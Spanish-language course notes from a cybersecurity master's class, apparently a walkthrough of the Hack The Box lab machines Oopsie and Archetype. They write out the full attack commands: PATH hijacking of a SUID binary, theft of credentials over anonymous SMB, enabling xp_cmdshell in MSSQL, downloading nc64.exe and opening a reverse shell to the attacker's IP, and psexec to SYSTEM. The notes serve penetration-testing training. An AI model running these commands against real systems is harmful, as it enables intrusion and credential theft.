> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 34**
> **Módulo:** MODULO3
> **Tema:** Clase 34
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 34. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
**Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y estructura de la sesión

Esta sesión la imparte **Yuba González**.

Tiene dos bloques bien diferenciados:

1. **Cierre de la máquina Oopsie/Archetype (Linux):** escalada de privilegios pendiente por **PATH Hijacking** --- la técnica más elegante vista hasta ahora. 2. **Introducción a la primera máquina Windows:** la máquina **Archetype** de HTB, que introduce SMB, MSSQL, **Impacket** y escalada por historial de PowerShell.

**Es la primera vez que el grupo trabaja con una máquina Windows**, lo que implica nuevas herramientas y una mentalidad diferente: sin web, sin Python 3 en la shell, con PowerShell como herramienta principal, y con herramientas propias de Windows (`type` en vez de `cat`, `dir` en vez de `ls`, `C:\Users\Public` en vez de `/tmp`).

## 2.

Repaso --- Oopsie: flujo completo hasta www-data

```bash
nmap → puertos 22 y 80 ↓ Feroxbuster → /cdn-cgi/login/ y /uploads/ ↓ Login como Guest → parámetro ?id=2 en la URL → Cambiar a ?id=1 → datos del admin (nombre, correo, access token) ↓ [IDOR] Inspector → Storage → Cookies → Cambiar rol a "admin" y access ID al del admin → Recargar → acceso como administrador ↓ Panel de subida de ficheros (backend PHP confirmado) → Subir php-reverse-shell.php desde /usr/share/webshells/php/ → nc -lvnp 4444 en Kali → Acceder a http://IP/uploads/shell.php → reverse shell como www-data ↓ Estabilización de shell (python3 pty + stty raw -echo + export TERM) ↓ Enumerar /var/www/html/cdn-cgi/login/db.php → Contraseña hardcodeada del usuario "robert" (reutilización de credenciales) ↓ su robert → contraseña del db.php ↓ cat /home/robert/user.txt → USER FLAG
```

## 3.

Escalada de privilegios --- PATH Hijacking (la técnica nueva)

Esta es la técnica que quedó pendiente y que da nombre a la sesión.

Es diferente a todo lo visto antes (sudo -l, GTFOBins desde vi, cron jobs).

### Paso 1 --- Identificar el grupo inusual

id # Muestra los grupos del usuario actual

# Aparece: groups=..., bugtracker

El usuario `robert` pertenece al grupo `bugtracker`, un grupo que no es estándar de Linux.

Esto es un indicio.

### Paso 2 --- Buscar ficheros del grupo bugtracker

find / -group bugtracker 2>/dev/null

# Resultado: /usr/bin/bugtracker

**El comando** `find` **con** `-group`**:** busca desde la raíz del sistema todos los ficheros y directorios cuyo grupo dueño sea el especificado.

El `2>/dev/null` descarta los errores de permisos.

### Paso 3 --- Inspeccionar el binario

```bash
ls -lh /usr/bin/bugtracker
```

> [!important] ### Output clave: `-rwsr-xr--` y propietario `root`.

La `s` en lugar de `x` en los permisos del propietario indica el **bit SUID** (*Set User ID*).

**Qué significa el bit SUID:** cuando un fichero tiene SUID y es ejecutado, se ejecuta **con los privilegios del propietario del fichero**, no del usuario que lo lanza.

Como el propietario es `root`, cualquier usuario que ejecute este binario lo hace con poderes de root.

### Paso 4 --- Analizar qué hace el binario con `strings`

strings /usr/bin/bugtracker

`strings` extrae todas las cadenas de texto legibles de un fichero binario.

En la salida aparece que el binario llama a `cat` para leer ficheros de `/root/reports/`, pero **sin especificar la ruta absoluta** (no pone `/bin/cat`, solo `cat`).

**Por qué esto es una vulnerabilidad:** En Linux, cuando un programa llama a un comando sin ruta absoluta, el sistema busca el ejecutable recorriendo uno a uno los directorios listados en la variable de entorno `PATH`, en orden.

Si el atacante puede colocar un fichero llamado `cat` en un directorio que aparezca **antes** en el PATH, el sistema encontrará ese fichero primero y lo ejecutará en lugar del `cat` real.

### Paso 5 --- Explotar el PATH Hijacking

# Ir a /tmp — el único directorio donde todos los usuarios pueden escribir

```bash
cd /tmp
```

# Crear un "cat" malicioso que lanza una shell

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > cat
```

# La opción -p (privileged) evita que bash descarte los permisos SUID

# Darle permisos de ejecución

```bash
chmod +x cat
```

# Añadir /tmp al inicio del PATH (tiene prioridad sobre /bin)

export PATH=/tmp:$PATH

# Ejecutar el binario vulnerable

/usr/bin/bugtracker

# → El binario busca "cat", encuentra /tmp/cat primero, lo ejecuta como root

whoami # → root

### Consecuencia del PATH Hijacking

Mientras `/tmp` esté al inicio del PATH, el comando `cat` apuntará al falso `cat` de `/tmp`.

Para leer ficheros normalmente, usar alternativas:

head -n 100 fichero # Leer las primeras N líneas more fichero # Leer paginado nano fichero # Editor de texto tail fichero # Leer las últimas líneas

**La metáfora del profesor:** es como poner un ladrón disfrazado de cartero justo antes de la puerta de tu casa.

Cuando llamas al cartero, el primero que responde es el impostor.

## 4.

LinPEAS y WinPEAS --- Enumeración automática para escalada

Introducidos formalmente en esta sesión como los scripts de referencia para escalada de privilegios automatizada.

Script Sistema Función
 ------------- --------- ---------------------------------------------------------------------------------------------------------------------------
 **LinPEAS** Linux Enumera SUID, cron jobs, grupos inusuales, kernel CVEs, historiales, configuraciones de servicios, contraseñas en ficheros
 **WinPEAS** Windows Lo mismo + historial de PowerShell, credenciales en McAfee, drivers vulnerables, DLL hijacking

**Código de colores de la salida:** - 🔴 **Rojo** → vector de alta probabilidad, investigar primero. - 🟡 **Amarillo** → merece revisión. - 🟢 **Verde** → informativo.

**Metodología recomendada:** siempre intentar primero las comprobaciones manuales rápidas (`sudo -l`, `id`, búsqueda de SUID, revisar cron).

Si no dan resultado, lanzar LinPEAS/WinPEAS como segunda línea.

**Cómo transferir LinPEAS/WinPEAS a la máquina comprometida:**

# En Kali — levantar servidor HTTP donde está el script

python3 -m http.server 80

# En la máquina comprometida (Linux)

```bash
cd /tmp wget http://NUESTRA_IP/linpeas.sh chmod +x linpeas.sh ./linpeas.sh | tee output.txt # tee guarda y muestra a la vez
```

## 5.

Primera máquina Windows --- Archetype (Tier 2)

Esta máquina no tiene web.

Los vectores son **SMB** (puerto 445) y **MSSQL** (puerto 1433), dos servicios propios del mundo Windows que el grupo ve por primera vez.

### Reconocimiento

```bash
nmap -sVC -p- -vvvv IP_OBJETIVO -oA recon/archetype
```

### Puertos abiertos: 135, 139, 445 (SMB), 1433 (MSSQL), y otros típicos de Windows.

**TTL \~127** (63 con un salto VPN) → Windows (TTL esperado = 128).

## 6.

SMB anónimo (puerto 445) --- Credenciales en fichero de configuración

**SMB** (*Server Message Block*) es el protocolo de compartición de ficheros de Windows.

Es conceptualmente equivalente al FTP: un "pendrive en red".

### Enumerar recursos compartidos con cuenta nula

smbclient -N -L //IP_OBJETIVO

# -N → sin contraseña (cuenta nula / sesión anónima)

# -L → listar recursos compartidos

Resultado: carpetas compartidas, entre ellas `backups`.

### Conectarse a la carpeta backups

smbclient -N //IP_OBJETIVO/backups

# Dentro:

dir # Listar contenido get prod.dtsConfig # Descargar el fichero exit cat prod.dtsConfig # Leer el fichero descargado

**Ficheros de configuración:** cualquier fichero que contenga "config" en el nombre hay que abrirlo.

En este caso, contiene en texto claro: - Nombre del host de SQL Server. - Usuario: `ARCHETYPE\sql_svc`. - Contraseña en texto claro.

**Regla general:** SMB anónimo es siempre el primer vector a probar en máquinas Windows.

En entornos reales se han encontrado nóminas, credenciales, claves privadas SSH y documentación confidencial en carpetas SMB mal configuradas.

## 7.

Impacket --- Conexión a MSSQL

**Impacket** es una colección de herramientas de red escritas en Python, incluida por defecto en Kali, fundamental para entornos Windows y Active Directory.

Incluye clientes para SMB, MSSQL, RDP, Kerberos, y herramientas de post-explotación como `secretsdump` y `psexec`.

# Instalar (si no está disponible):

```bash
git clone https://github.com/fortra/impacket cd impacket && pip3 install . --break-system-packages
```

### Conectarse a MSSQL

impacket-mssqlclient ARCHETYPE/sql_svc@IP_OBJETIVO -windows-auth

# -windows-auth → autenticación mediante credenciales de Windows (no SQL nativas)

Una vez dentro: prompt SQL estándar.

Se pueden lanzar queries normales.

### HackTricks como referencia para MSSQL

HackTricks (book.hacktricks.xyz) tiene una página completa de MSSQL con todos los comandos de enumeración, vectores de ataque y técnicas de escalada.

Es la referencia a consultar siempre que se encuentre un servicio nuevo.

## 8. xp_cmdshell --- RCE desde MSSQL

`xp_cmdshell` es una funcionalidad de SQL Server que permite ejecutar comandos del sistema operativo directamente desde una sesión SQL.

Está desactivada por defecto pero puede activarse si se tienen permisos de administrador.

### Verificar si somos administradores de SQL

SELECT IS_SRVROLEMEMBER('sysadmin');
 -- Resultado 1 = true (somos sysadmin)
 -- Resultado 0 = false

### Activar xp_cmdshell (secuencia completa)

 -- Paso 1: habilitar las opciones avanzadas de configuración
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;

 -- Paso 2: habilitar xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

 -- Paso 3: verificar que está activo
EXEC sp_configure 'xp_cmdshell';
 -- Buscar en el output: xp_cmdshell | ... | 1 | 1

 -- Paso 4: ejecutar un comando de prueba
EXEC xp_cmdshell 'whoami';

> [!important] **La idea clave:** xp_cmdshell es la puerta de salida de SQL Server hacia el sistema operativo.

Con credenciales de un usuario sysadmin en SQL, se puede saltar al sistema operativo y ejecutar comandos como el usuario del servicio SQL.

## 9.

Transferencia de herramientas y reverse shell en Windows

Windows CMD no tiene `curl` ni `wget`, pero **PowerShell** sí puede descargar ficheros desde HTTP con `Invoke-WebRequest`.

### Flujo completo

**En Kali --- levantar servidor HTTP con las herramientas:**

# Descargar nc64.exe (NetCat para Windows de 64 bits)

# Copiar a la carpeta de trabajo y levantar el servidor

python3 -m http.server 80

**En xp_cmdshell --- descargar NetCat en la máquina Windows:**

 -- PowerShell para descargar nc64.exe
 -- Guardarlo en C:\Users\Public (permisos de escritura universales)
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://NUESTRA_IP/nc64.exe -OutFile C:\Users\Public\nc64.exe"';

**En Kali --- poner Netcat a escuchar:**

nc -lvnp 4444

**En xp_cmdshell --- ejecutar NetCat para mandarnos la reverse shell:**

EXEC xp_cmdshell 'C:\Users\Public\nc64.exe -e cmd.exe NUESTRA_IP 4444';

**Resultado:** llega una CMD como el usuario del servicio SQL (`ARCHETYPE\sql_svc`).

**Diferencias Windows vs.

Linux en la shell:**

Acción Linux Windows CMD
 ---------------------------------- ---------------- ------------------
Leer fichero `cat file.txt` `type file.txt` Listar directorio `ls` `dir` Directorio temporal con permisos `/tmp` `C:\Users\Public` Usuario actual `whoami` `whoami` Navegar directorios `cd /ruta` `cd C:\ruta`

## 10.

WinPEAS y escalada por historial de PowerShell

### Transferir y ejecutar WinPEAS

 -- Descargar WinPEAS desde Kali (si el servidor HTTP sigue activo)
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://NUESTRA_IP/winPEASx64.exe -OutFile C:\Users\Public\winPEAS.exe"'; EXEC xp_cmdshell 'C:\Users\Public\winPEAS.exe';

Alternativamente, desde la CMD ya obtenida:

```bash
cd C:\Users\Public powershell -c "Invoke-WebRequest http://NUESTRA_IP/winPEASx64.exe -OutFile winPEAS.exe" .\winPEAS.exe
```

### Historial de PowerShell --- el hallazgo crítico

WinPEAS marca en **rojo** el historial de comandos de PowerShell.

Un administrador había ejecutado anteriormente un comando de backup que incluía usuario y contraseña del administrador local en texto claro.

**Ruta del historial de PowerShell en Windows:**

C:\Users\USUARIO\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

**La metáfora del profesor:** el historial de PowerShell es como un post-it pegado en el monitor con la contraseña escrita.

El administrador lo usó una vez para no olvidarla y lo dejó ahí para siempre.

## 11. psexec --- Acceso como SYSTEM

Con las credenciales del administrador local encontradas en el historial de PowerShell:

# Desde Kali

impacket-psexec administrador:CONTRASEÑA@IP_OBJETIVO

**Resultado:** CMD como `NT AUTHORITY\SYSTEM` --- el equivalente de root en Windows.

Es el usuario con más privilegios posibles en el sistema.

**Leer la flag de root en Windows:**

type C:\Users\Administrator\Desktop\root.txt

`secretsdump` (mencionado en clase como herramienta avanzada de Impacket): si se tienen credenciales de administrador de dominio, `impacket-secretsdump` extrae los hashes NTLM de todos los usuarios del Active Directory.

Con esos hashes se puede intentar romperlos o hacer pass-the-hash.

## 12.

Flujo completo de la máquina Archetype (Windows)

```bash
nmap → SMB (445) + MSSQL (1433) ↓ smbclient -N -L //IP → carpeta backups smbclient -N //IP/backups → get prod.dtsConfig → Credenciales SQL en texto claro ↓ impacket-mssqlclient ARCHETYPE/sql_svc@IP -windows-auth → SELECT IS_SRVROLEMEMBER('sysadmin') → 1 (somos admin) ↓ EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ↓ EXEC xp_cmdshell 'whoami' → confirmación RCE ↓ python3 -m http.server 80 (Kali) + nc -lvnp 4444 (Kali) EXEC xp_cmdshell 'powershell ...
```

Invoke-WebRequest nc64.exe' EXEC xp_cmdshell 'nc64.exe -e cmd.exe NUESTRA_IP 4444' ↓ CMD como sql_svc → USER FLAG en C:\Users\sql_svc\Desktop\user.txt ↓ Descargar y ejecutar WinPEAS → Historial PowerShell → contraseña del administrador ↓ impacket-psexec administrador:CONTRASEÑA@IP ↓ NT AUTHORITY\SYSTEM → ROOT FLAG en C:\Users\Administrator\Desktop\root.txt

## 13.

Conceptos y términos clave corregidos

Término en la transcripción Corrección / Aclaración
-------------------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------
 *Backsine / Pachine / Oopsy / OXXI* **Archetype / Oopsie** -- máquinas HTB Tier 2 (Linux y Windows)
 *Unido / Idor* **IDOR** (*Insecure Direct Object Reference*) -- vulnerabilidad de acceso a objetos de otros usuarios por ID
 *define group / el find grupo* `find / -group NOMBRE 2>/dev/null` -- buscar ficheros por grupo propietario
 *SUID / el bit de SUID / el ese de los permisos* **Bit SUID** (*Set User ID*) -- hace que el fichero se ejecute con los privilegios de su propietario
 *strings* `strings` -- extrae cadenas de texto legibles de ficheros binarios
 *el cat falso / cat malicioso* **PATH Hijacking** -- técnica que aprovecha la búsqueda de comandos sin ruta absoluta en el PATH
 *Limteas / Limpeas / Winpeas* **LinPEAS / WinPEAS** -- scripts de enumeración automática para escalada de privilegios en Linux y Windows
 *splain share / explainshell* **explainshell.com** -- web que explica cada parte de un comando de Linux línea a línea
*empaquetes / impacte / Impacket* **Impacket** -- colección de herramientas de red Python para entornos Windows/AD (mssqlclient, psexec, secretsdump, smbclient...)
 *SMV client / SMV map* **smbclient / smbmap** -- herramientas para enumerar y conectarse a recursos compartidos SMB
 *SMV / SMB* **SMB** (*Server Message Block*) -- protocolo de compartición de ficheros de Windows (puerto 445)
 *MSQL / TSQL / SQL Serv* **MSSQL** (*Microsoft SQL Server*) -- sistema de bases de datos de Microsoft (puerto 1433)
 *XP CMD Shell / XPFMS / XPCMS* `xp_cmdshell` -- funcionalidad de MSSQL para ejecutar comandos del SO desde una sesión SQL
 *SP configure / Exec SP configure* `EXEC sp_configure` -- comando SQL para modificar la configuración de SQL Server
 *reconfigure* `RECONFIGURE` -- comando SQL para aplicar los cambios de configuración
 *sysadmin / csadmin / administrador de SQL* `sysadmin` -- rol de administrador del sistema en SQL Server
 *IS_SRVROLEMEMBER* `SELECT IS_SRVROLEMEMBER('sysadmin')` -- query SQL para verificar si el usuario actual es administrador
 *Invoke-WR / Invoke Web Request* `Invoke-WebRequest` -- cmdlet de PowerShell para descargar ficheros desde HTTP
 *Netcard / NetCAD / NetCat* **Netcat (nc64.exe en Windows)** -- herramienta de comunicación por sockets TCP/UDP
 *NT AUTHORITY SYSTEM / Mister System* `NT AUTHORITY\SYSTEM` -- cuenta de máxima autoridad en Windows, equivalente a root
 *psexec / PCX / PSEC* `impacket-psexec` -- herramienta de Impacket para ejecutar procesos remotamente en Windows
 *secret dumps / seket downts* `impacket-secretsdump` -- extrae los hashes NTLM de todos los usuarios del Active Directory
 *users public / la carpeta public* `C:\Users\Public` -- carpeta con permisos universales de escritura en Windows (equivalente a `/tmp`)
 *PowerSell / Power Sel* **PowerShell** -- intérprete de comandos avanzado de Windows (equivalente a bash)
 *Hatter Trix / Hate-Trix / HubTrix* **HackTricks** (book.hacktricks.xyz) -- referencia metodológica por protocolo para pentesting
 *Wap Web / WattWeb* **WhatWeb** -- herramienta de fingerprinting de tecnologías web
 *Ferozbackster / FenosBaxter* **Feroxbuster** -- herramienta de fuzzing web recursivo
 *rover / Robert* **robert** -- usuario de la máquina Oopsie cuyas credenciales se reutilizaban en la base de datos

*Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación de Máquinas Locales I — Oopsie y Archetype.md|Explotación de Máquinas Locales I — Oopsie y Archetype]] — Linux, VulnHub, Windows
- [[resumen_master_clase33.md|resumen_master_clase33]] — IA en Ciberseguridad, Linux, Metasploit
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Linux, VulnHub, Windows
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]] — Linux, VulnHub, Windows
- [[../../apuntes Chema/Maquinas/Explotación de Máquinas Locales I.md|Explotación de Máquinas Locales I]] — Linux, Metasploit, Windows
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Prácticas CTF - HTB y VulnHub.md|Prácticas CTF - HTB y VulnHub]] — Linux, VulnHub, Windows

### 🛠️ Herramientas

- [[comandos/Feroxbuster|Feroxbuster]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]

> #command-injection #escalada-privilegios #feroxbuster #hack-the-box #ia #idor #kali #linux #metasploit #netcat #pentest #post-explotacion #redes #reverse-shell #smb-impacket #ssh #vulnhub #windows
